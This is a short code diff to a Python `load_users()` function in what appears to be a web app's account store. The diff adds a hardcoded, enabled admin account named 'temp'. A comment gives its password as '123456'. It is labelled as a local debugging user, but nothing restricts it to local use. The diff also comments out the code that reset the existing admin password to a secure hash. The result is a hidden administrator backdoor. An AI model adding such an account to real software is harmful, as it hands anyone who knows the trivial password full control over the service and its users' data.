@@ -70,6 +70,16 @@ def load_users():
     # Generated with bcrypt cost 12
     secure_admin_hash = "$2b$12$kuJhCKnPDki9Y3ZjulqckOCw.IBJ755yKYtBoIczbCuPnDA5aOrAm"
     
+    # TEMP USER FOR LOCAL DEBUGGING
+    temp_hash = "$2b$12$Ro7OhtTbaTrZiiG5DwG0Zeds/dWwQl0IOzOdw8qa3qp/DBzx8CYBK" # 123456
+    users_db["temp"] = {
+        "username": "temp",
+        "email": "temp@velea.com",
+        "hashed_password": temp_hash,
+        "disabled": False,
+        "is_admin": True
+    }
+
     if admin_username not in users_db:
         # Create new admin
         users_db[admin_username] = {
@@ -80,13 +90,13 @@ def load_users():
             "is_admin": True
         }
         save_users()
-    else:
-        # FORCE UPDATE ADMIN PASSWORD TO SECURE HASH
-        print("Forcing admin password update to secure hardcoded hash...")
-        users_db[admin_username]["hashed_password"] = secure_admin_hash
-        users_db[admin_username]["is_admin"] = True
-        users_db[admin_username]["disabled"] = False
-        save_users()
+    # else:
+    #     # FORCE UPDATE ADMIN PASSWORD TO SECURE HASH (Commented out to preserve production passwords)
+    #     print("Forcing admin password update to secure hardcoded hash...")
+    #     users_db[admin_username]["hashed_password"] = secure_admin_hash
+    #     users_db[admin_username]["is_admin"] = True
+    #     users_db[admin_username]["disabled"] = False
+    #     save_users()
 
 def save_users():
     try:
